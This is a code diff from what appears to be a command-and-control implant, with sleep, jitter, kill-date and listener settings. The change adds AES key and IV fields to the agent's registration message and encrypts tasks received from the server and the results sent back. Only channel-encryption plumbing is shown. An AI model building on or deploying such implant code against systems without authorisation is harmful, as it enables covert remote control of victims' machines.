@@ -33,6 +33,8 @@ namespace Handler
         std::wstring wSleep = Utils::Convert::UTF8Decode(std::to_string(pState->nSleep));
         std::wstring wJitter = Utils::Convert::UTF8Decode(std::to_string(pState->nJitter));
         std::wstring wKillDate = Utils::Convert::UTF8Decode(std::to_string(pState->nKillDate));
+        std::wstring wAesKey = AES_KEY_BASE64_W;
+        std::wstring wAesIV = AES_IV_BASE64_W;
 
         // Get listener URL
         wListenerURL += std::wstring(pState->lpListenerProto);
@@ -72,6 +74,10 @@ namespace Handler
         wJson += L"\"jitter\":" + wJitter + L"";
         wJson += L",";
         wJson += L"\"killDate\":" + wKillDate + L"";
+        wJson += L",";
+        wJson += L"\"aesKey\":\"" + wAesKey + L"\"";
+        wJson += L",";
+        wJson += L"\"aesIV\":\"" + wAesIV + L"\"";
         wJson += L"}";
 
         return wJson;
@@ -128,8 +134,31 @@ namespace Handler
 
         pState->hRequest = resp.hRequest;
 
-        pState->wTask = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
-        pState->taskJSON = Parser::ParseTask(pState->wTask);
+        std::wstring wTaskEnc = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
+
+        // We need to decrypt and encrypt to send back the task value for server-side decryption correctly.
+        std::vector<BYTE> taskDec = Crypt::Decrypt(
+            wTaskEnc,
+            pState->pCrypt->pAES->hKey,
+            pState->pCrypt->pAES->iv
+        );
+        if (taskDec.size() == 0)
+        {
+            return FALSE;
+        }
+
+        pState->wTask = Crypt::Encrypt(
+            taskDec,
+            pState->pCrypt->pAES->hKey,
+            pState->pCrypt->pAES->iv
+        );
+
+        // Parse the task to JSON
+        pState->taskJSON = Parser::ParseTask(
+            taskDec,
+            pState->pCrypt->pAES->hKey,
+            pState->pCrypt->pAES->iv
+        );
 
         return TRUE;
     }
@@ -344,7 +373,11 @@ namespace Handler
 
         // Encrypt task result
         std::string sTaskResultJSON = pState->taskResultJSON.dump();
-        std::wstring wEnc = Crypt::Encrypt(std::vector<BYTE>(sTaskResultJSON.begin(), sTaskResultJSON.end()));
+        std::wstring wEnc = Crypt::Encrypt(
+            std::vector<BYTE>(sTaskResultJSON.begin(), sTaskResultJSON.end()),
+            pState->pCrypt->pAES->hKey,
+            pState->pCrypt->pAES->iv
+        );
         std::string sEnc = Utils::Convert::UTF8Encode(wEnc);
 
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
